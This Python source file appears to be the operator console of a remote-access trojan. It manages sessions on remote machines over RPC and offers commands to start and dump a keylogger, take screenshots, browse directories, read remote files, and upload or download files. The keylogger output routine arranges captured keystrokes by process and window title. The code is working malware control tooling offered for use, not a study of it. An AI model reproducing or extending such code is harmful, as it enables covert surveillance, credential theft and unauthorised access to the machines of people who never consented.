# -*- coding: utf-8 -*-

import base64
import cmd
import collections
from contextlib import contextmanager
import itertools
import math
import os
import time

from tabulate import tabulate
from tqdm import tqdm

from . import connection
from . import rpc


class SessionCmd(cmd.Cmd):
    unsup_header = 'Unsupported commands:'

    def __init__(self, session, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.session = session

    @property
    def prompt(self):
        return '({}:{}:{}) '.format(
                self.session.id,
                self.session.username,
                self.session.hostname,
        )

    @property
    def rpc(self):
        return self.session.rpc

    def do_help(self, arg):
        'List available commands with "help" or detailed help with "help cmd".'
        if arg:
            return super().do_help(arg)
        # copied from github cmd.py source code.
        names = self.get_names()
        cmds_doc = []
        cmds_undoc = []
        cmds_unsup = list()
        help = {}
        unsupported = list()
        for name in names:
            if name[:4] == 'req_':
                if not self._command_supported(name[4:]):
                    unsupported.append(name[4:])
            elif name[:5] == 'help_':
                help[name[5:]]=1
        names.sort()
        # There can be duplicates if routines overridden
        prevname = ''
        for name in names:
            if name[:3] == 'do_':
                if name == prevname:
                    continue
                prevname = name
                cmd=name[3:]
                if cmd in unsupported:
                    cmds_unsup.append(cmd)
                elif cmd in help:
                    cmds_doc.append(cmd)
                    del help[cmd]
                elif getattr(self, name).__doc__:
                    cmds_doc.append(cmd)
                else:
                    cmds_undoc.append(cmd)
        self.stdout.write("%s\n"%str(self.doc_leader))
        self.print_topics(self.doc_header, cmds_doc, 15, 80)
        self.print_topics(self.misc_header, list(help.keys()), 15, 80)
        self.print_topics(self.undoc_header, cmds_undoc, 15, 80)
        self.print_topics(self.unsup_header, cmds_unsup, 15, 80)

    def columnize(self, list, displaywidth=80):
        n = 4
        list = [list[i:i+n] for i in range(0, len(list), n)]
        self.stdout.write(tabulate(list, tablefmt='plain') + '\n')

    def _command_supported(self, name):
        supported = False
        if hasattr(self, 'do_' + name):
            supported = True
        if hasattr(self, 'req_' + name):
            cmd_dir = getattr(self, 'req_' + name)()
            sess_dir = self.session.dir()
            if not all(name in sess_dir for name in cmd_dir):
                supported = False
        return supported

    def cmdloop(self, intro=None, *args, **kwargs):
        '''Handle keyboard interrupts during cmdloop.'''
        try:
            super().cmdloop(intro=intro, *args, **kwargs)
        except KeyboardInterrupt:
            print()
        else:
            return

        while True:
            try:
                super().cmdloop(intro='', *args, **kwargs)
            except KeyboardInterrupt:
                print()
            else:
                return

    def onecmd(self, line):
        cmd, arg, line = self.parseline(line)
        if not line:
            return self.emptyline()
        if cmd is None:
            return self.default(line)
        self.lastcmd = line
        if line == 'EOF':
            self.lastcmd = ''
        if cmd == '':
            return self.default(line)

        try:
            func = getattr(self, 'do_' + cmd)
        except AttributeError:
            return self.default(line)

        if not self._command_supported(cmd):
            self.error('Command not supported by remote client')
            return

        return func(arg)

    def error(self, msg):
        print('***', msg.capitalize())

    def emptyline(self):
        return

    def default(self, line):
        self.error('Unknown syntax: {}'.format(line))

    def do_exit(self, line):
        '''Return to the main server shell.'''
        return True

    def do_clear(self, line):
        '''Clear the console screen.'''
        os.system('clear')

    def do_info(self, line):
        '''Display remote system information.'''
        header = '\nSystem information (type info <topic>):'
        ruler = self.ruler * len(header)
        info = [
                ['Session ID:', self.session.id],
                ['Username:', self.session.username],
                ['Hostname:', self.session.hostname],
                ['Platform:', self.session.platform],
                ['Architecture:', 'x86'],
        ]
        table = tabulate(info, tablefmt='plain')
        lines = '\n'.join([header, ruler, table])
        self.stdout.write(lines + '\n\n')


class PayloadSessionCmd(SessionCmd):

    def req_keylogger(self):
        return ['keylogger_start', 'keylogger_dump', 'keylogger_stop']
    
    def do_keylogger(self, line):
        '''Log the keys pressed on the remote machine.'''
        cmd = line
        cmds = {
                'start': self.rpc.keylogger_start,
                'dump': self._dump_keylog,
                'stop': self.rpc.keylogger_stop,
        }
        try:
            cmds[cmd]()
        except KeyError:
            self.error('Invalid argument: {}'.format(cmd))

    def _dump_keylog(self):
        dq = self.rpc.keylogger_dump()
        last_exe = ''
        space = '\n'
        for entry in dq:
            if entry['event'] == 'Keylogger.start':
                print('Keylogger started - {0:%Y-%m-%d %H:%M:%S}'.format(
                    entry['time'],
                ))
                space = ''
                continue

            if entry['event'] == 'Keylogger.stop':
                print(space, end='')
                print('Keylogger stopped - {0:%Y-%m-%d %H:%M:%S}'.format(
                    entry['time'],
                ))
                last_exe = ''
                continue

            if entry['exe'] != last_exe:
                print()
                print(space, end='')
                header = '{} ({}) - {}'.format(
                        entry['exe'],
                        entry['pid'],
                        entry['title'],
                )
                print(header)
                print('-'*len(header))
                last_exe = entry['exe']
                print_timestamp = True

            if print_timestamp:
                print('({0:%Y-%m-%d %H:%M:%S}) '.format(entry['time']), end='')
                print_timestamp = False

            try:
                key = '<{}>'.format(
                        entry['key'].split('.')[1].capitalize(),
                )
            except IndexError:
                key = entry['key']

            if 'Enter' in key:
                key = '\n'
                print_timestamp = True
                space = ''
            elif 'Space' in key:
                key = ' '
            elif 'Backspace' in key:
                key = key.replace('Backspace', 'Back')
            else:
                space = '\n\n'

            print(key, end='')

    def req_screenshot(self):
        return ['screenshot']

    def do_screenshot(self, line):
        '''Take a screenshot of the remote machine.'''
        pass

    def req_ls(self):
        return ['list_dir', 'get_current_dir']

    def do_ls(self, line):
        '''List a directory from the remote machine.'''
        path = line
        if not path:
            path = '.'

        try:
            listing = self.rpc.list_dir(path)
        except FileNotFoundError:
            self.error('No such file or directory: {}'.format(path))
        except NotADirectoryError:
            self.error('Not a directory: {}'.format(path))
        else:
            directory = path
            if directory == '.':
                directory = self.rpc.get_current_dir()
            header = 'Directory listing ({}):'.format(directory)
            ruler = self.ruler * len(header)
            print()
            print(header)
            print(ruler)
            self.columnize(listing)
            print()

    def req_cd(self):
        return ['change_dir']

    def do_cd(self, line):
        '''Change the current working directory of the remote machine.'''
        path = line
        if not path:
            path = '~'
        try:
            self.rpc.change_dir(path)
        except FileNotFoundError:
            self.error('No such file or directory: {}'.format(path))
        except NotADirectoryError:
            self.error('Not a directory: {}'.format(path))

    def req_pwd(self):
        return ['get_current_dir']

    def do_pwd(self, line):
        '''Print the current working directory of the remote machine.'''
        print(self.rpc.get_current_dir())
    
    def req_cat(self):
        return ['open_file', 'list_dir']

    def complete_cat(self, text, line, begidx, endidx):
        files = self.rpc.list_dir('.')
        if not text:
            return files
        return [f for f in files if f.startswith(text)]

    def do_cat(self, line):
        '''Display the contents of a remote file.'''
        name = line
        try:
            with self.rpc.open_file(name, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    try:
                        chunk = chunk.decode()
                    except UnicodeDecodeError:
                        pass
                    print(chunk)
        except (FileNotFoundError, IsADirectoryError) as e:
            self.error(str(e))

    def req_upload(self):
        return ['open_file', 'write_file']

    def do_upload(self, line):
        '''Upload a file to the remote machine.'''
        try:
            local_path, remote_output = line.split()
        except ValueError:
            self.error('Argument error')
            print('usage: upload <local_path> <remote_output>')
            return

        file_size = os.path.getsize(local_path)
        with open(local_path, 'rb') as lf, self.rpc.open_file(remote_output, 'wb') as rf:
            chunk_size = 1024
            l_bar = '{desc}: {percentage:.0f}%|'
            bar_fmt = l_bar + '{bar:20}{r_bar}'

            print()
            hdr = 'File upload progress ({}):'.format(local_path)
            print(hdr)
            print(self.ruler * len(hdr))
            with tqdm(
                    #desc='  {}'.format(local_path),
                    bar_format=bar_fmt,
                    ascii=False,
                    colour='blue',
                    unit="B",
                    unit_scale=True,
                    unit_divisor=chunk_size,
                    total=file_size,

            ) as progress:
                while True:
                    chunk = lf.read(chunk_size)
                    if not chunk:
                        break
                    rf.write(chunk)
                    progress.update(len(chunk))
        print()

    def req_download(self):
        return ['get_file_size', 'open_file', 'read_file']

    def do_download(self, line):
        '''Download a file from the remote machine.'''
        try:
            remote_path, outpath = line.split()
        except ValueError:
            self.error('Argument error')
            print('usage: download <remote_path> <output_path>')
            return

        file_size = self.rpc.get_file_size(remote_path)
        outfile = open(outpath, 'wb')
        try:
            with self.rpc.open_file(remote_path, 'rb') as f:
                chunk_size = 1024
                l_bar = '{desc}: {percentage:.0f}%|'
                bar_fmt = l_bar + '{bar:20}{r_bar}'

                #print('Downloading file: {} ...'.format(remote_path))
                hdr = 'File download progress ({}):'.format(remote_path)
                print()
                print(hdr)
                print(self.ruler * len(hdr))

                with tqdm(
                        #desc='{}'.format(remote_path),
                        bar_format=bar_fmt,
                        ascii=False,
                        #colour='blue',
                        unit="B",
                        unit_scale=True,
                        unit_divisor=chunk_size,
                        total=file_size,

                ) as progress:
                    while True:
                        chunk = f.read(chunk_size)
                        if not chunk:
                            break
                        outfile.write(chunk)
                        progress.update(len(chunk))

        except (FileNotFoundError, IsADirectoryError) as e:
            self.error(str(e))
        finally:
            outfile.close()
        print()


class RemoteFile:

    def __init__(self, file_id, rpc):
        self.file_id = file_id
        self.rpc = rpc

    def read(self, size):
        data = self.rpc.read_file(self.file_id, size)
        return base64.urlsafe_b64decode(data)

    def write(self, data):
        data = base64.urlsafe_b64encode(data)
        self.rpc.write_file(self.file_id, data)


class SessionRPCProxy(rpc.RPCProxy):

    @contextmanager
    def open_file(self, path, mode='r'):
        file_id = self.__getattr__('open_file')(path, mode)
        rfile = RemoteFile(file_id, self)
        try:
            yield rfile
        finally:
            self.close_file(file_id)


class Session:
    
    def __init__(self, socket):
        self.sock = socket
        self.connection = connection.Connection(socket)
        self.rpc = SessionRPCProxy(self.connection)
        self.last_response = time.time()
        self._username = None
        self._hostname = None
        self._dir = None
        self._platform = None

    @property
    def username(self):
        if self._username is None:
            self._username = self.rpc.get_username()
        return self._username

    @property
    def hostname(self):
        if self._hostname is None:
            self._hostname = self.rpc.get_hostname()
        return self._hostname

    @property
    def platform(self):
        if self._platform is None:
            self._platform = self.rpc.get_platform()
        return self._platform

    def dir(self):
        '''Returns a list of registered rpc functions.'''
        if self._dir is None:
            self._dir = self.rpc.dir()
        return self._dir

    def close(self):
        self.connection.close()


class SessionContainer:

    def __init__(self):
        self._sessions = collections.OrderedDict()
        self._counter = itertools.count()

    def __bool__(self):
        return bool(self._sessions)

    def __iter__(self):
        return iter(self._sessions)

    def __getitem__(self, name):
        return self._sessions[name]

    def __getattr__(self, name):
        return getattr(self._sessions, name)

    def _generate_id(self):
        return '{:x}'.format(next(self._counter))

    def add(self, session):
        sess_id = self._generate_id()
        self._sessions[sess_id] = session
        session.id = sess_id

    def remove(self, session):
        del self._sessions[session.id]

